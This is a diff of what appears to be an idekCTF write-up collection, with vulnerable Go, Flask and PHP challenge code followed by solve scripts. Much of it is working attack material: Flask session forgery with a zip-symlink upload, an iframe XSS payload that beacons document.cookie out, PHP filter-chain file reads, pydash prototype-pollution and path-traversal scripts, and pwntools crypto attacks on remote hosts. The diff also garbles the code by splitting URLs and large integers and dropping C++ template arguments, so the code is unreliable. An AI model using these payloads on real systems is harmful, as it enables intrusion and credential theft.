@@ -6,11 +6,6 @@
 
 ```
 http.HandleFunc("/just-read-it", justReadIt)
-```
-
-
-
-```
 func justReadIt(w http.ResponseWriter, r *http.Request) {
         defer r.Body.Close()
 
@@ -63,25 +58,10 @@ func justReadIt(w http.ResponseWriter, r *http.Request) {
         w.WriteHeader(200)
         w.Write([]byte(os.Getenv("FLAG")))
 }
-```
-
-
-
-```
 type ReadOrderReq struct {
         Orders []int `json:"orders"`
 }
-```
-
-
-
-```
 reader := bytes.NewReader(randomData)
-```
-
-
-
-```
 func initRandomData() {
         rand.Seed(1337)
         randomData = make([]byte, 24576)
@@ -90,22 +70,12 @@ func initRandomData() {
         }
         copy(randomData[12625:], password[:])
 }
-```
-
-
-
-```
 func (v *Validator) CheckReadOrder(o int) error {
         if o <= 0 || o > 100 {
                 return fmt.Errorf("invalid order %v", o)
         }
         return nil
 }
-```
-
-
-
-```
 if err := validator.Validate(ctx); err != nil {
                 w.WriteHeader(500)
                 w.Write([]byte(fmt.Sprintf("validation failed: %vn", err)))
@@ -114,11 +84,6 @@ if err := validator.Validate(ctx); err != nil {
 
         w.WriteHeader(200)
         w.Write([]byte(os.Getenv("FLAG")))
-```
-
-
-
-```
 func (v *Validator) Validate(ctx context.Context) error {
         r, _ := GetValidatorCtxData(ctx)
         buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
@@ -130,11 +95,6 @@ func (v *Validator) Validate(ctx context.Context) error {
         }
         return nil
 }
-```
-
-
-
-```
 func (v *Validator) Read(ctx context.Context) ([]byte, error) {
         r, s := GetValidatorCtxData(ctx)
         buf := make([]byte, s)
@@ -144,11 +104,6 @@ func (v *Validator) Read(ctx context.Context) ([]byte, error) {
         }
         return buf, nil
 }
-```
-
-
-
-```
 func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
         reader := ctx.Value(reqValReaderKey).(io.Reader)
         size := ctx.Value(reqValSizeKey).(int)
@@ -157,36 +112,16 @@ func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
         }
         return reader, size
 }
-```
-
-
-
-```
 // NewReader returns a new Reader whose buffer has the default size.
 func NewReader(rd io.Reader) *Reader {
         return NewReaderSize(rd, defaultBufSize)
 }
-```
-
-
-
-```
 @app.route("/flag")
 def flag():
     if not session.get("admin"):
         return "Unauthorized!"
     return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
-```
-
-
-
-```
 app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
-```
-
-
-
-```
 @app.route("/upload", methods=["GET", "POST"])
 def upload():
     if not session.get("uid"):
@@ -203,25 +138,16 @@ def upload():
     filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
     file.save(filename)
     subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])    
-    flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
+    flash(f'Your unique ID is [{uuidpath}](/uploads/{uuidpath})!', "success")
     logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
     return redirect("/upload")
-```
-
-
-
-```
-@app.route("/uploads/<path:path>")
+@app.route("/uploads/")
 def uploads(path):
     try:
         return send_from_directory(DATA_DIR + "uploads", path)
-    except PermissionError:
+    
+except PermissionError:
         abort(404)
-```
-
-
-
-```
 # Configure logging
 LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
 LOG_HANDLER.setFormatter(logging.Formatter(fmt="[{levelname}] [{asctime}] {message}", style='{'))
@@ -232,17 +158,7 @@ for handler in logging.root.handlers[:]:
     logging.root.removeHandler(handler)
 logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
 logging.getLogger().addHandler(logging.StreamHandler())
-```
-
-
-
-```
 decoded = {'admin': True, 'uid': userinfo['username']}
-```
-
-
-
-```
 import base64
 
 import requests, re, time, datetime, random
@@ -251,7 +167,8 @@ import flask_unsign
 sess = requests.session()
 SECRET_OFFSET = -67198624 * 1000
 userinfo = {"username": "yyds", "password": "yyds"}
-baseurl = "http://127.0.0.1:1337/"
+baseurl = "http://127.0.0.1:
+1337/"
 pocZip = "UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA"
 cookie = ""
 log_url = ""
@@ -296,23 +213,8 @@ if __name__ == '__main__':
             continue
         print(res)
         break
-```
-
-
-
-```
-<iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>
-```
-
-
-
-```
-{"xxx":"<iframe name='navigator.sendBeacon(atob(/url/.source),document.cookie)' srcdoc='<div id=json-input>[-3]</div><script defer src=/static/js/main.js></script><iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>"}
-```
-
-
-
-```
+</head><frameset id=opts cols=eval(name)></frameset>&quot;>'>
+{"xxx":"</script></head><frameset id=opts cols=eval(name)></frameset>&quot;>'>"}
 <?php
 
         error_reporting(0);
@@ -334,56 +236,22 @@ if __name__ == '__main__':
         }
            
     ?>
-```
-
-
-
-```
 FREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W"����>==�@C������>==�@
-```
-
-
-
-```
 http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag
-```
-
-
-
-```
 python php_filter_chain_generator.py --chain 'FREE  '
-```
-
-
-
-```
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
-```
-
-
-
-```
 >>> pydash.set_({"A":{"B":"C"}}, "A.B", "D")
 {'A': {'B': 'D'}}
-```
-
-
-
-```
 pydash.set_(
     TaskManager(),
     '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.xxx',
     'xxx'
 )
-```
-
-
-
-```
 import requests
 import re
 
-base_url = 'http://127.0.0.1:1337'
+base_url = 'http://127.0.0.1:
+1337'
 url      = f'{base_url}/api/manage_tasks'
 exp_url  = f'{base_url}/../../usr/local/lib/python3.8/turtle.py'
 app      = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app'
@@ -410,15 +278,11 @@ p.url = exp_url
 r = s.send(p)
 flag = re.findall('idek{.*}', r.text)[0]
 print(flag)
-```
-
-
-
-```
 import requests
 import re
 
-base_url = 'http://127.0.0.1:1337'
+base_url = 'http://127.0.0.1:
+1337'
 url      = f'{base_url}/api/manage_tasks'
 exp_url  = f'{base_url}/../Dockerfile'
 
@@ -433,14 +297,10 @@ p.url = exp_url
 r = s.send(p)
 flag = re.findall('idek{.*}', r.text)[0]
 print(flag)
-```
-
-
-
-```
 import requests, re
 
-base_url = 'http://127.0.0.1:1337'
+base_url = 'http://127.0.0.1:
+1337'
 url      = f'{base_url}/api/manage_tasks'
 flag_url = f'{base_url}/../../tmp/flag'
 
@@ -465,13 +325,9 @@ p.url = flag_url
 r = s.send(p)
 flag = re.findall('idek{.*}', r.text)[0]
 print(flag)
-```
-
-
-
-```
 from pwn import *
-host, port = 'cleithrophobia.chal.idek.team:1337'.split(':')
+host, port = 'cleithrophobia.chal.idek.team:
+1337'.split(':')
 io = remote(host, int(port))
 
 def oracle(payload):
@@ -509,12 +365,7 @@ for i in range(len(flag) - 1):
 flag = b''.join(t2)
 print(flag)
 # flag{wh0_3v3n_c0m3s_up_w1th_r1d1cul0us_sch3m3s_l1k3_th1s__0h_w41t__1_d0}
-```
-
-
-
-```
-#sage
+    #sage
 from gmpy2 import *
 from Crypto.Util.number import long_to_bytes
 
@@ -543,12 +394,16 @@ f1 = f[2] - f[3] * Te[1]
 f2 = Te[0]**3 + a*Te[0] - Te[1]**2-(Me[0]**3 + a*Me[0] - Me[1]**2)
 print(f2)
 a0=-1019268867267849424908357367733931941383149668286864008861662442680604058151693707791547011105186550019092586871229367602480951232469366295595128740384313397226761125592114592001298261062965213964211518794413291961567779146411551935492149763883963272734637871273976142997464735273842094527385872407012350495753298964870092922939941557312324244091706263803037684216879489854927518197495340486943316099448245524778860809444971443935794707968413693163036741320366137839392605690457251072731869232133843078162397057596189198269026990658078279998575424676768178510688889622050681034958153231556029864713685758814785896436116013310016899574654253785383489362957328536913784532588181648611237704933470028564747329012603054002623952267126949886810588734363614455501359064859547724824540676184962858003962647114120432607459636061800842389469449254464940592103479283633803337327710969181902456604551946745128222513462440426982787689316/35461333983286132926179897165780122930994201369054489434069331558328676041354175029113880576792635056014821537727621929367395775348058444984139345937482903866216723668650381489254556656243626825448157082781627457815353457873166675359113112992434419615906572916077530737800547480858069601139990567555071853852
-#assert Zmod(n)(a0)==a1
+    #assert Zmod(n)(a0)==a1
 b1=int(str(f0(a0)).split('/')[0])
 b2=int(str(f1(a0)).split('/')[0])
 
 n=ZZ(gcd(b1,b2))
-d=99193023581616109152177764300040037859521925088272985981669959946817746109531909713425474710564402873765914926441545005839662821744603138460681680285655317684469203777533871394260260583839662628325884473084768835902143240687542429953968760669321064892423877370896609497584167478711224462305776836476437268587
+d=99193023581616109152177764300040037859521925088272985981669959946817746109
+5319097134254747105644028737659149264415450058396628217446031384606816802856
+5531768446920377753387139426026058383966262832588447308476883590214324068754
+2429953968760669321064892423877370896609497584167478711224462305776836476437
+268587
 a=Zmod(n)(a0)
 b=(Te[1]^2-(Te[0]^3+a*Te[0]))%n
 
@@ -558,20 +413,19 @@ q=121062857594576038376462096984737874471395761576057166273768890777386090865955
 E1=EllipticCurve(GF(p),[a,b])
 E2=EllipticCurve(GF(q),[a,b])
 E=EllipticCurve(Zmod(n),[a,b])
-#order=E1.order()*E2.order()
-order=148789535372424163728266646450060056789282887632409478972504939920226619164296671910830162422173521086104260442096339694304886999126003562791358712412416317442287195786906697615489065379945573862193455179868067475036156124279466870451072060581891741234837916854904063588317305400955406105882208744056825746850
+    #order=E1.order()*E2.order()
+order=1487895353724241637282666464500600567892828876324094789725049399202266
+1916429667191083016242217352108610426044209633969430488699912600356279135871
+2412416317442287195786906697615489065379945573862193455179868067475036156124
+2794668704510720605818917412348379168549040635883173054009554061058822087440
+56825746850
 print(order)
 dd=invert(3,order)
 print(long_to_bytes(ZZ((E(Me)*dd)[0])))
 '''
 b"It is UNBREAKABLE, I tell you!! I'll even bet a flag on it, here it is: idek{Sh3_s3ll5_5n4k3_01l_0n_7h3_5e4_5h0r3}"
 '''
-```
-
-
-
-```
-#sage
+    #sage
 from pwn import *
 import itertools
 from Crypto.Util.number import *
@@ -622,7 +476,7 @@ def small_roots(f, bounds, m=2, d=None):
     return []
 
 context.log_level="debug"
-#s=process(['python3','oracle.py'])
+    #s=process(['python3','oracle.py'])
 s=remote("chronophobia.chal.idek.team",1337)
 s.recvuntil(b'Here is your random token: ')
 t=int(s.recvline()[:-1].decode())
@@ -675,12 +529,7 @@ s.recvuntil(b'>>> ')
 s.sendline(b'3')
 s.recvline()
 
-#idek{St@rburst_str3@m!!!}
-```
-
-
-
-```
+    #idek{St@rburst_str3@m!!!}
 from pwn import *
 from Crypto.Util.number import *
 
@@ -729,11 +578,6 @@ print(f"{l = }")
 print(f"{r = }")
 print(f"{sec = }")
 io.interactive()
-```
-
-
-
-```
 d = 47
 M = Matrix(GF(2),47,47)
 taps = [47, 43, 41, 37, 31, 29, 23, 19, 17, 13, 11, 7, 5, 3, 2]
@@ -778,11 +622,6 @@ with open("mat2.txt", "w") as f:
          for j in i:
              l.append(str(int(j)))
          f.write(" ".join(l)+"n")
-```
-
-
-
-```
 from Crypto.Util.number import *
 import random
 
@@ -829,25 +668,20 @@ for i in range(1 << 24):
 with open("pq.txt", "w") as f:
     for p, q in ans:
         f.write(str(p) + " " + str(q) + "n")
-```
-
-
-
-```
-#include <set>
-#include <map>
-#include <cmath>
-#include <cassert>
-#include <queue>
-#include <vector>
-#include <cstdio>
-#include <numeric>
-#include <cstring>
-#include <iostream>
-#include <algorithm>
+    #include <set>
+    #include <map>
+    #include <cmath>
+    #include <cassert>
+    #include <queue>
+    #include <vector>
+    #include <cstdio>
+    #include <numeric>
+    #include <cstring>
+    #include 
+    #include <algorithm>
 using namespace std;
 using ll = long long;
-using vint = vector<int>;
+using vint = vector;
 using namespace std;
 
 inline int read() {
@@ -894,7 +728,7 @@ int main() {
   reverse(mat1.begin(), mat1.end());
   reverse(mat2.begin(), mat2.end());
   vector<ll> l;
-  vector<pair<ll, ll>> B;
+  vector> B;
   for (int i = 0; i < 23; i++)
     l.push_back(mat1[i]);
   for (int i = 0; i < 24; i++)
@@ -919,7 +753,7 @@ int main() {
     assert(x);
     B.push_back(make_pair(x, p));
   }
-  vector<vector<int>> posp(512, vector<int>()), posq(512, vector<int>());
+  vector<vector> posp(512, vector()), posq(512, vector());
   for (int i = 0; i < 512; i++) {
     ll x = mat1[i];
     ll p = 0;
@@ -951,7 +785,7 @@ int main() {
 
   // this file could be 8.6G big!
   f = fopen("real_pq.txt", "w");
-  vector<int> _l(47);
+  vector _l(47);
 
   for (int i = 0; i < n; i++) {
     ll _p = p[i], _q = q[i];
@@ -987,11 +821,6 @@ int main() {
   fclose(f);
   return 0;
 }
-```
-
-
-
-```
 p = 8148641146281585626599965707019875487540363795516672614500530970713004312213378852992447549855928600229171345524388095399807768385341698813126095446000969
 q = 9595401536948702154260950703331322993513137152314157248261000347717193558940157103084976690783331034882701052399602064548436624663369151807143327408382209
 enc = 39952631182502523101053953538875437560829302998610236142339435591980522271590392249355510253125310494063081880512061476177621613835835483055753316172267380484804011034657479491794064534740537749793563744927827732170347495398050941609682485707331552759412916426691849669362897656967530464847648838434750188588
@@ -1001,11 +830,6 @@ e = inverse(0x10001, phi)
 m = pow(enc, e, p*q)
 print(long_to_bytes(m))
 # b'idek{th3_prim3_g3n3r4ti0n_is_c001_but_n0t_s3cur3_QAQ}n'
-```
-
-
-
-```
 from hashlib import sha256
 from netcat import *
 from Crypto.Util.number import *
